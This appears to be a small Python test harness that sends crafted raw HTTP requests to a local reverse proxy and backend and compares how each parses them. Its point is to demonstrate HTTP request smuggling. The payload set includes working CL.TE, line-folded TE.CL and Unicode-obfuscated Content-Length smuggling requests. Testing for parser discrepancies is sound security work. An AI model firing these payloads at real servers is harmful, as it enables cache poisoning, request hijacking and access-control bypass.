#!/usr/bin/env python3
"""
test_proxy_backend.py - Mini Test Suite for Differential Parsing
----------------------------------------------------------------
A small, standalone test suite to demonstrate how a Reverse Proxy 
and a Backend Web Server parse the same HTTP requests differently.

This proves the concept of HTTP Request Smuggling (HTTP Desync) 
without needing the full fuzzing engine.
"""

import socket
import json
import time

PROXY_HOST = "127.0.0.1"
PROXY_PORT = 8888
BACKEND_HOST = "127.0.0.1"
BACKEND_PORT = 9001
TIMEOUT = 3.0

# ─── PRE-CRAFTED PAYLOADS ───────────────────────────────────────────────────

PAYLOADS = {
    "1. Normal Request (Baseline)": (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Length: 11\r\n"
        b"\r\n"
        b"hello=world"
    ),

    "2. Classic CL.TE Smuggling": (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Length: 42\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"GET /smuggled HTTP/1.1\r\n"
        b"Foo: x"
    ),

    "3. Line Folding Obfuscation (TE.CL)": (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Length: 4\r\n"
        b"Transfer-Encoding:\r\n"  # Line folding
        b" chunked\r\n"
        b"\r\n"
        b"12\r\n"
        b"xxGET /smuggled...\r\n"
        b"0\r\n"
        b"\r\n"
    ),

    "4. Obfuscated TE (Full-width Unicode bypass)": (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Length: ４\r\n"  # Unicode 4
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"4\r\n"
        b"test\r\n"
        b"0\r\n"
        b"\r\n"
    )
}

# ─── HELPER FUNCTIONS ────────────────────────────────────────────────────────

def send_payload(host, port, payload):
    """Send payload via raw TCP socket and return parsed state or status."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((host, port))
        s.sendall(payload)

        time.sleep(0.2)
        resp = s.recv(4096).decode('latin-1', errors='ignore')
        s.close()
        
        if not resp:
            return "Timeout/Dropped"
            
        # Parse status code
        status = resp.split("\r\n")[0]
        
        # Parse State Tuple JSON if available
        if "\r\n\r\n" in resp:
            body = resp.split("\r\n\r\n", 1)[1]
            if body.strip().startswith("{"):
                try:
                    data = json.loads(body.strip())
                    return f"[{status}]  |  Parsed CL: {data.get('content_length', 'None')}  |  Parsed TE: {data.get('transfer_encoding', 'None')}"
                except json.JSONDecodeError:
                    pass
        
        return f"[{status}] (No State Tuple JSON matched)"

    except Exception as e:
        return f"Error: {e}"

# ─── MAIN TEST RUNNER ────────────────────────────────────────────────────────

def run_tests():
    print("=" * 80)
    print("  MINI TEST SUITE: REVERSE PROXY VS BACKEND PARSING DIFFERENCE")
    print("=" * 80)
    print(f"Proxy  : {PROXY_HOST}:{PROXY_PORT}")
    print(f"Backend: {BACKEND_HOST}:{BACKEND_PORT}\n")

    for name, payload in PAYLOADS.items():
        print(f"\033[1;96m[Test Case] {name}\033[0m")
        print("-" * 80)
        
        proxy_result = send_payload(PROXY_HOST, PROXY_PORT, payload)
        backend_result = send_payload(BACKEND_HOST, BACKEND_PORT, payload)

        is_diff = proxy_result != backend_result
        color = "\033[91m" if is_diff else "\033[92m"
        reset = "\033[0m"

        print(f"  {color}Proxy (Nginx)   :\033[0m {proxy_result}")
        print(f"  {color}Backend (WSGI) :\033[0m {backend_result}")
        
        if is_diff:
            print(f"  {color}--> XẢY RA LỖI SAI LỆCH (DISCREPANCY DETECTED)!{reset}")
        else:
            print(f"  \033[92m--> Đồng nhất (Consistent parsing).{reset}")
        print("\n")

if __name__ == "__main__":
    run_tests()
